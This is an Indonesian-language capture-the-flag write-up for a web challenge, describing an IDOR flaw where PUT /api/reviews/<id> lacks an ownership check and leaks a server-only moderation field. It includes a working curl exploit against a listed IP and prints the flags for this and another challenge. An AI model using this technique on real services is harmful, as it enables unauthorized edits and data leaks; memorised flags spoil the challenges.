---
ctf: "RIFFHACK 2026"
kategori: "Web"
challenge: "Marketplace Reviews Look Tidy"
flag: "bitflag{r3v13w_0wn3r5h1p_1s_n0t_4_sugg35t10n}"
teknik: "IDOR PUT /api/reviews/<id> tanpa cek kepemilikan; respons membocorkan kolom moderationNote server-only"
---

# Marketplace Reviews Look Tidy — RIFFHACK 2026 (Web)

## Deskripsi Singkat

IDOR pada `PUT /api/reviews/<id>` yang mengembalikan seluruh baris, termasuk kolom `moderationNote` server-only. Dua string berbentuk-flag muncul di respons; hanya satu yang jawaban sesungguhnya.

## Analisis & Eksploitasi

`PUT` menerima user terautentikasi mana pun, tanpa cek kepemilikan, dan mengembalikan baris penuh saat sukses. Temukan baris target lewat pivot SQLi (web3): satu baris cocok, id `seed-phantom-hacker`, pemilik `k7m3n`, `moderationNote` membawa flag. ID pemilik `k7m3n` juga jadi petunjuk untuk web7.

```bash
curl -s -b "$COOKIE" -X PUT -H 'Content-Type: application/json' \
  -d '{"reviewText":"y"}' \
  http://159.89.230.27/api/reviews/seed-phantom-hacker \
  | python3 -c 'import json,sys; print(json.load(sys.stdin)["review"]["moderationNote"])'
# bitflag{r3v13w_0wn3r5h1p_1s_n0t_4_sugg35t10n}
```

Teks review yang baru tidak masalah — respons-nya adalah kebocorannya.

**Membedakan dua string berbentuk-flag.** Respons penuhnya mengandung `fileHash` (MD5 biasa, bukan flag) dan `moderationNote` (flag sungguhan). Kalau kamu POST review *baru* alih-alih PUT baris seed, server men-stamp `bitflag{md5_1s_br0k3n_l1k3_my_h34rt}` ke `fileHash` — itu jawaban asli untuk The Proof Stamp dan umpan di sini.

## Catatan / Insight

Membedakan baris seed dari baris buatan user lewat apakah `fileHash`-nya terlihat seperti hash atau flag adalah petunjuk berguna tersendiri.

## Flag

```
bitflag{r3v13w_0wn3r5h1p_1s_n0t_4_sugg35t10n}
```
